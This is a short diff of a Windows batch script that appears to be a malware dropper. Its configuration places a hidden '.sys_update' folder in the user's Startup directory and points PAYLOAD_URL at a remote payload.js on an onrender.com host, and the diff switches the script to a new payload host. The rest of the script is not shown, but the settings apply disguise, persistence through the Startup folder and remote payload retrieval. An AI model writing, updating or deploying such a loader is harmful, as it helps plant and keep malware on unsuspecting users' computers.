@@ -3,7 +3,7 @@ setlocal enabledelayedexpansion
 
 :: --- CONFIGURATION ---
 set "DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update"
-set "PAYLOAD_URL=https://payload-x3rf.onrender.com/payload.js"
+set "PAYLOAD_URL=https://payloadea.onrender.com/payload.js"
 set "LOCAL_PAYLOAD=%DIR%\payload.js"
 set "LOG_FILE=%DIR%\install.log"
 
